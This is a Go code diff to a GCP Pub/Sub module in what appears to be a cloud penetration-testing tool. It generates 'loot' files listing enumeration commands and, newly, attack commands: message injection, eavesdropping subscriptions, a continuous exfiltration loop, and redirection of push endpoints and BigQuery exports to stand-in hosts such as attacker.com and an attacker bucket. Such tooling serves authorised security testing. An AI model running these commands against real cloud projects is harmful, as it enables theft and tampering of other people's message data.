@@ -223,15 +223,31 @@ func (m *PubSubModule) addTopicToLoot(projectID string, topic PubSubService.Topi
 		return
 	}
 
+	// Check for public access
+	publicAccess := ""
+	for _, binding := range topic.IAMBindings {
+		if shared.IsPublicPrincipal(binding.Member) {
+			publicAccess = " [PUBLIC ACCESS]"
+			break
+		}
+	}
+
 	lootFile.Contents += fmt.Sprintf(
-		"## Topic: %s (Project: %s)\n"+
+		"# ==========================================\n"+
+			"# TOPIC: %s%s\n"+
+			"# ==========================================\n"+
+			"# Project: %s\n"+
 			"# Subscriptions: %d\n",
-		topic.Name, topic.ProjectID,
-		topic.SubscriptionCount,
+		topic.Name, publicAccess,
+		topic.ProjectID, topic.SubscriptionCount,
 	)
 
 	if topic.KmsKeyName != "" {
 		lootFile.Contents += fmt.Sprintf("# KMS Key: %s\n", topic.KmsKeyName)
+	}
+
+	if topic.SchemaSettings != "" {
+		lootFile.Contents += fmt.Sprintf("# Schema: %s\n", topic.SchemaSettings)
 	}
 
 	if len(topic.IAMBindings) > 0 {
@@ -241,19 +257,51 @@ func (m *PubSubModule) addTopicToLoot(projectID string, topic PubSubService.Topi
 		}
 	}
 
-	lootFile.Contents += fmt.Sprintf(
-		"\n# Describe topic:\n"+
-			"gcloud pubsub topics describe %s --project=%s\n\n"+
-			"# Get IAM policy:\n"+
-			"gcloud pubsub topics get-iam-policy %s --project=%s\n\n"+
-			"# List subscriptions:\n"+
-			"gcloud pubsub topics list-subscriptions %s --project=%s\n\n"+
-			"# Publish a message:\n"+
-			"gcloud pubsub topics publish %s --message='test' --project=%s\n\n",
+	lootFile.Contents += fmt.Sprintf(`
+# === ENUMERATION COMMANDS ===
+
+# Describe topic
+gcloud pubsub topics describe %s --project=%s
+
+# Get IAM policy
+gcloud pubsub topics get-iam-policy %s --project=%s
+
+# List all subscriptions for this topic
+gcloud pubsub topics list-subscriptions %s --project=%s
+
+# List snapshots for this topic
+gcloud pubsub snapshots list --filter="topic:%s" --project=%s
+
+# === EXPLOITATION COMMANDS ===
+
+# Publish a test message (requires pubsub.topics.publish)
+gcloud pubsub topics publish %s --message='{"test": "message"}' --project=%s
+
+# Publish message with attributes
+gcloud pubsub topics publish %s --message='test' --attribute='key1=value1,key2=value2' --project=%s
+
+# Publish from file
+# echo '{"sensitive": "data"}' > message.json
+# gcloud pubsub topics publish %s --message="$(cat message.json)" --project=%s
+
+# === ATTACK SCENARIOS ===
+
+# Message Injection: If you can publish, inject malicious messages
+# gcloud pubsub topics publish %s --message='{"cmd": "malicious_command"}' --project=%s
+
+# Create a new subscription to eavesdrop on messages (requires pubsub.subscriptions.create)
+# gcloud pubsub subscriptions create attacker-sub-%s --topic=%s --project=%s
+
+`,
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
 		topic.Name, topic.ProjectID,
+		topic.Name, topic.ProjectID,
+		topic.Name, topic.ProjectID,
+		topic.Name, topic.ProjectID,
+		topic.Name, topic.ProjectID,
+		topic.Name, topic.Name, topic.ProjectID,
 	)
 }
 
@@ -263,17 +311,40 @@ func (m *PubSubModule) addSubscriptionToLoot(projectID string, sub PubSubService
 		return
 	}
 
+	// Check for public access
+	publicAccess := ""
+	for _, binding := range sub.IAMBindings {
+		if shared.IsPublicPrincipal(binding.Member) {
+			publicAccess = " [PUBLIC ACCESS]"
+			break
+		}
+	}
+
 	lootFile.Contents += fmt.Sprintf(
-		"## Subscription: %s (Project: %s)\n"+
+		"# ==========================================\n"+
+			"# SUBSCRIPTION: %s%s\n"+
+			"# ==========================================\n"+
+			"# Project: %s\n"+
 			"# Topic: %s\n",
-		sub.Name, sub.ProjectID,
-		sub.Topic,
+		sub.Name, publicAccess,
+		sub.ProjectID, sub.Topic,
 	)
 
 	// Cross-project info
 	if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
 		lootFile.Contents += fmt.Sprintf("# Cross-Project: Yes (topic in %s)\n", sub.TopicProject)
 	}
+
+	// Subscription type
+	subType := "Pull"
+	if sub.PushEndpoint != "" {
+		subType = "Push"
+	} else if sub.BigQueryTable != "" {
+		subType = "BigQuery Export"
+	} else if sub.CloudStorageBucket != "" {
+		subType = "Cloud Storage Export"
+	}
+	lootFile.Contents += fmt.Sprintf("# Type: %s\n", subType)
 
 	// Push endpoint info
 	if sub.PushEndpoint != "" {
@@ -302,6 +373,11 @@ func (m *PubSubModule) addSubscriptionToLoot(projectID string, sub PubSubService
 		)
 	}
 
+	// Filter
+	if sub.Filter != "" {
+		lootFile.Contents += fmt.Sprintf("# Filter: %s\n", sub.Filter)
+	}
+
 	// IAM bindings
 	if len(sub.IAMBindings) > 0 {
 		lootFile.Contents += "# IAM Bindings:\n"
@@ -310,27 +386,171 @@ func (m *PubSubModule) addSubscriptionToLoot(projectID string, sub PubSubService
 		}
 	}
 
-	lootFile.Contents += fmt.Sprintf(
-		"\n# Describe subscription:\n"+
-			"gcloud pubsub subscriptions describe %s --project=%s\n\n"+
-			"# Get IAM policy:\n"+
-			"gcloud pubsub subscriptions get-iam-policy %s --project=%s\n\n"+
-			"# Pull messages:\n"+
-			"gcloud pubsub subscriptions pull %s --project=%s --limit=10 --auto-ack\n\n",
+	lootFile.Contents += fmt.Sprintf(`
+# === ENUMERATION COMMANDS ===
+
+# Describe subscription
+gcloud pubsub subscriptions describe %s --project=%s
+
+# Get IAM policy
+gcloud pubsub subscriptions get-iam-policy %s --project=%s
+
+# List snapshots for this subscription
+gcloud pubsub snapshots list --project=%s
+
+# === EXPLOITATION COMMANDS ===
+
+# Pull messages WITHOUT acknowledging (peek at messages, they stay in queue)
+gcloud pubsub subscriptions pull %s --project=%s --limit=100
+
+# Pull and acknowledge messages (removes them from queue - destructive!)
+gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack
+
+# Pull messages with wait (useful for real-time monitoring)
+# gcloud pubsub subscriptions pull %s --project=%s --limit=10 --wait
+
+# === MESSAGE EXFILTRATION ===
+
+# Continuous message pulling loop (exfiltrate all messages)
+# while true; do gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack --format=json >> exfiltrated_messages.json; sleep 1; done
+
+# Pull and save to file
+# gcloud pubsub subscriptions pull %s --project=%s --limit=1000 --format=json > messages.json
+
+# === SNAPSHOT & SEEK ATTACKS ===
+
+# Create a snapshot of current subscription state (requires pubsub.snapshots.create)
+# gcloud pubsub snapshots create snapshot-%s --subscription=%s --project=%s
+
+# Seek to beginning of retention period (replay all retained messages)
+# gcloud pubsub subscriptions seek %s --time="2024-01-01T00:00:00Z" --project=%s
+
+# Seek to a snapshot (replay messages from snapshot point)
+# gcloud pubsub subscriptions seek %s --snapshot=snapshot-%s --project=%s
+
+`,
+		sub.Name, sub.ProjectID,
+		sub.Name, sub.ProjectID,
+		sub.ProjectID,
 		sub.Name, sub.ProjectID,
 		sub.Name, sub.ProjectID,
 		sub.Name, sub.ProjectID,
+		sub.Name, sub.ProjectID,
+		sub.Name, sub.ProjectID,
+		sub.Name, sub.Name, sub.ProjectID,
+		sub.Name, sub.ProjectID,
+		sub.Name, sub.Name, sub.ProjectID,
 	)
 
-	// BigQuery command
-	if sub.BigQueryTable != "" {
-		lootFile.Contents += fmt.Sprintf("# Query BigQuery export:\nbq show %s\n\n", sub.BigQueryTable)
+	// Push endpoint specific attacks
+	if sub.PushEndpoint != "" {
+		lootFile.Contents += fmt.Sprintf(`# === PUSH ENDPOINT ATTACKS ===
+
+# Current push endpoint: %s
+# Push SA: %s
+
+# Modify push endpoint to redirect messages to attacker-controlled server (requires pubsub.subscriptions.update)
+# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://attacker.com/webhook"
+
+# Remove push config (convert to pull subscription for easier exfiltration)
+# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint=""
+
+# Change push authentication (OIDC token attack)
+# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="%s" --push-auth-service-account="attacker-sa@attacker-project.iam.gserviceaccount.com"
+
+`,
+			sub.PushEndpoint, sub.PushServiceAccount,
+			sub.Name, sub.ProjectID,
+			sub.Name, sub.ProjectID,
+			sub.Name, sub.ProjectID, sub.PushEndpoint,
+		)
 	}
 
-	// GCS command
-	if sub.CloudStorageBucket != "" {
-		lootFile.Contents += fmt.Sprintf("# List GCS export:\ngsutil ls gs://%s/\n\n", sub.CloudStorageBucket)
+	// BigQuery export attacks
+	if sub.BigQueryTable != "" {
+		lootFile.Contents += fmt.Sprintf(`# === BIGQUERY EXPORT ATTACKS ===
+
+# Current export table: %s
+
+# Query exported messages from BigQuery
+bq query --use_legacy_sql=false 'SELECT * FROM %s LIMIT 1000'
+
+# Export BigQuery table to GCS for bulk download
+# bq extract --destination_format=NEWLINE_DELIMITED_JSON '%s' gs://attacker-bucket/exported_messages/*.json
+
+# Show table schema (understand message structure)
+bq show --schema %s
+
+`,
+			sub.BigQueryTable,
+			strings.Replace(sub.BigQueryTable, ":", ".", 1),
+			sub.BigQueryTable,
+			sub.BigQueryTable,
+		)
 	}
+
+	// GCS export attacks
+	if sub.CloudStorageBucket != "" {
+		lootFile.Contents += fmt.Sprintf(`# === CLOUD STORAGE EXPORT ATTACKS ===
+
+# Current export bucket: %s
+
+# List exported message files
+gsutil ls -la gs://%s/
+
+# Download all exported messages
+gsutil -m cp -r gs://%s/ ./exported_messages/
+
+# Stream new exports as they arrive
+# gsutil -m rsync -r gs://%s/ ./exported_messages/
+
+`,
+			sub.CloudStorageBucket,
+			sub.CloudStorageBucket,
+			sub.CloudStorageBucket,
+			sub.CloudStorageBucket,
+		)
+	}
+
+	// Dead letter topic attacks
+	if sub.DeadLetterTopic != "" {
+		lootFile.Contents += fmt.Sprintf(`# === DEAD LETTER TOPIC ATTACKS ===
+
+# Dead letter topic: %s
+# Messages that fail delivery %d times go here
+
+# Create subscription to dead letter topic to capture failed messages
+# gcloud pubsub subscriptions create dlq-eavesdrop --topic=%s --project=%s
+
+# Dead letters often contain sensitive data from failed processing
+
+`,
+			sub.DeadLetterTopic, sub.MaxDeliveryAttempts,
+			sub.DeadLetterTopic, sub.ProjectID,
+		)
+	}
+
+	// Cross-project attack scenarios
+	if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
+		lootFile.Contents += fmt.Sprintf(`# === CROSS-PROJECT ATTACK SCENARIOS ===
+
+# This subscription reads from topic in project: %s
+# This indicates a trust relationship between projects
+
+# Check if you have access to the source topic
+gcloud pubsub topics describe %s --project=%s
+
+# If you can publish to the source topic, you can inject messages
+# gcloud pubsub topics publish %s --message='injected' --project=%s
+
+`,
+			sub.TopicProject,
+			sub.Topic, sub.TopicProject,
+			sub.Topic, sub.TopicProject,
+		)
+	}
+
+	lootFile.Contents += "\n"
 }
 
 // ------------------------------
@@ -346,41 +566,101 @@ func (m *PubSubModule) writeOutput(ctx context.Context, logger internal.Logger) 
 
 func (m *PubSubModule) getTopicsHeader() []string {
 	return []string{
-		"Project Name", "Project ID", "Topic Name", "Subscriptions",
-		"KMS Key", "Retention", "Resource Role", "Resource Principal",
+		"Project",
+		"Topic",
+		"Subscriptions",
+		"Schema",
+		"KMS Key",
+		"Retention",
+		"Public Publish",
+		"IAM Binding Role",
+		"IAM Binding Principal",
 	}
 }
 
 func (m *PubSubModule) getSubsHeader() []string {
 	return []string{
-		"Project Name", "Project ID", "Subscription", "Topic", "Type",
-		"Push Endpoint / Export", "Cross-Project", "Dead Letter", "Resource Role", "Resource Principal",
+		"Project",
+		"Subscription",
+		"Topic",
+		"Topic Project",
+		"Type",
+		"Destination",
+		"Filter",
+		"Ack Deadline",
+		"Retention",
+		"Dead Letter",
+		"Public Subscribe",
+		"IAM Binding Role",
+		"IAM Binding Principal",
 	}
 }
 
 func (m *PubSubModule) topicsToTableBody(topics []PubSubService.TopicInfo) [][]string {
 	var body [][]string
 	for _, topic := range topics {
+		schema := "-"
+		if topic.SchemaSettings != "" {
+			schema = topic.SchemaSettings
+		}
+
 		kmsKey := "-"
 		if topic.KmsKeyName != "" {
-			kmsKey = topic.KmsKeyName
+			// Extract just the key name from full path for readability
+			parts := strings.Split(topic.KmsKeyName, "/")
+			if len(parts) > 0 {
+				kmsKey = parts[len(parts)-1]
+			} else {
+				kmsKey = topic.KmsKeyName
+			}
 		}
+
 		retention := "-"
 		if topic.MessageRetentionDuration != "" {
 			retention = topic.MessageRetentionDuration
 		}
 
+		// Check for public publish access
+		publicPublish := "No"
+		for _, binding := range topic.IAMBindings {
+			if shared.IsPublicPrincipal(binding.Member) {
+				// Check if role allows publishing
+				if strings.Contains(binding.Role, "publisher") ||
+					strings.Contains(binding.Role, "admin") ||
+					binding.Role == "roles/pubsub.editor" ||
+					binding.Role == "roles/owner" ||
+					binding.Role == "roles/editor" {
+					publicPublish = "Yes"
+					break
+				}
+			}
+		}
+
 		if len(topic.IAMBindings) > 0 {
 			for _, binding := range topic.IAMBindings {
 				body = append(body, []string{
-					m.GetProjectName(topic.ProjectID), topic.ProjectID, topic.Name,
-					fmt.Sprintf("%d", topic.SubscriptionCount), kmsKey, retention, binding.Role, binding.Member,
+					m.GetProjectName(topic.ProjectID),
+					topic.Name,
+					fmt.Sprintf("%d", topic.SubscriptionCount),
+					schema,
+					kmsKey,
+					retention,
+					publicPublish,
+					binding.Role,
+					binding.Member,
 				})
 			}
 		} else {
 			body = append(body, []string{
-				m.GetProjectName(topic.ProjectID), topic.ProjectID, topic.Name,
-				fmt.Sprintf("%d", topic.SubscriptionCount), kmsKey, retention, "-", "-",
+				m.GetProjectName(topic.ProjectID),
+				topic.Name,
+				fmt.Sprintf("%d", topic.SubscriptionCount),
+				schema,
+				kmsKey,
+				retention,
+				publicPublish,
+				"-",
+				"-",
 			})
 		}
 	}
@@ -403,9 +683,24 @@ func (m *PubSubModule) subsToTableBody(subs []PubSubService.SubscriptionInfo) []
 			destination = sub.CloudStorageBucket
 		}
 
-		crossProject := "-"
+		topicProject := "-"
 		if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
-			crossProject = sub.TopicProject
+			topicProject = sub.TopicProject
+		}
+
+		filter := "-"
+		if sub.Filter != "" {
+			filter = sub.Filter
+		}
+
+		ackDeadline := "-"
+		if sub.AckDeadlineSeconds > 0 {
+			ackDeadline = fmt.Sprintf("%ds", sub.AckDeadlineSeconds)
+		}
+
+		retention := "-"
+		if sub.MessageRetention != "" {
+			retention = sub.MessageRetention
 		}
 
 		deadLetter := "-"
@@ -413,17 +708,57 @@ func (m *PubSubModule) subsToTableBody(subs []PubSubService.SubscriptionInfo) []
 			deadLetter = sub.DeadLetterTopic
 		}
 
+		// Check for public subscribe access
+		publicSubscribe := "No"
+		for _, binding := range sub.IAMBindings {
+			if shared.IsPublicPrincipal(binding.Member) {
+				// Check if role allows subscribing/consuming
+				if strings.Contains(binding.Role, "subscriber") ||
+					strings.Contains(binding.Role, "admin") ||
+					binding.Role == "roles/pubsub.editor" ||
+					binding.Role == "roles/pubsub.viewer" ||
+					binding.Role == "roles/owner" ||
+					binding.Role == "roles/editor" ||
+					binding.Role == "roles/viewer" {
+					publicSubscribe = "Yes"
+					break
+				}
+			}
+		}
+
 		if len(sub.IAMBindings) > 0 {
 			for _, binding := range sub.IAMBindings {
 				body = append(body, []string{
-					m.GetProjectName(sub.ProjectID), sub.ProjectID, sub.Name, sub.Topic, subType,
-					destination, crossProject, deadLetter, binding.Role, binding.Member,
+					m.GetProjectName(sub.ProjectID),
+					sub.Name,
+					sub.Topic,
+					topicProject,
+					subType,
+					destination,
+					filter,
+					ackDeadline,
+					retention,
+					deadLetter,
+					publicSubscribe,
+					binding.Role,
+					binding.Member,
 				})
 			}
 		} else {
 			body = append(body, []string{
-				m.GetProjectName(sub.ProjectID), sub.ProjectID, sub.Name, sub.Topic, subType,
-				destination, crossProject, deadLetter, "-", "-",
+				m.GetProjectName(sub.ProjectID),
+				sub.Name,
+				sub.Topic,
+				topicProject,
+				subType,
+				destination,
+				filter,
+				ackDeadline,
+				retention,
+				deadLetter,
+				publicSubscribe,
+				"-",
+				"-",
 			})
 		}
 	}
@@ -440,12 +775,16 @@ func (m *PubSubModule) buildTablesForProject(projectID string) []internal.TableF
 	var tableFiles []internal.TableFile
 	if len(topicsBody) > 0 {
 		tableFiles = append(tableFiles, internal.TableFile{
-			Name: globals.GCP_PUBSUB_MODULE_NAME + "-topics", Header: m.getTopicsHeader(), Body: topicsBody,
+			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-topics",
+			Header: m.getTopicsHeader(),
+			Body:   topicsBody,
 		})
 	}
 	if len(subsBody) > 0 {
 		tableFiles = append(tableFiles, internal.TableFile{
-			Name: globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions", Header: m.getSubsHeader(), Body: subsBody,
+			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions",
+			Header: m.getSubsHeader(),
+			Body:   subsBody,
 		})
 	}
 	return tableFiles
@@ -510,12 +849,16 @@ func (m *PubSubModule) writeFlatOutput(ctx context.Context, logger internal.Logg
 	var tableFiles []internal.TableFile
 	if len(topicsBody) > 0 {
 		tableFiles = append(tableFiles, internal.TableFile{
-			Name: globals.GCP_PUBSUB_MODULE_NAME + "-topics", Header: m.getTopicsHeader(), Body: topicsBody,
+			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-topics",
+			Header: m.getTopicsHeader(),
+			Body:   topicsBody,
 		})
 	}
 	if len(subsBody) > 0 {
 		tableFiles = append(tableFiles, internal.TableFile{
-			Name: globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions", Header: m.getSubsHeader(), Body: subsBody,
+			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions",
+			Header: m.getSubsHeader(),
+			Body:   subsBody,
 		})
 	}
 
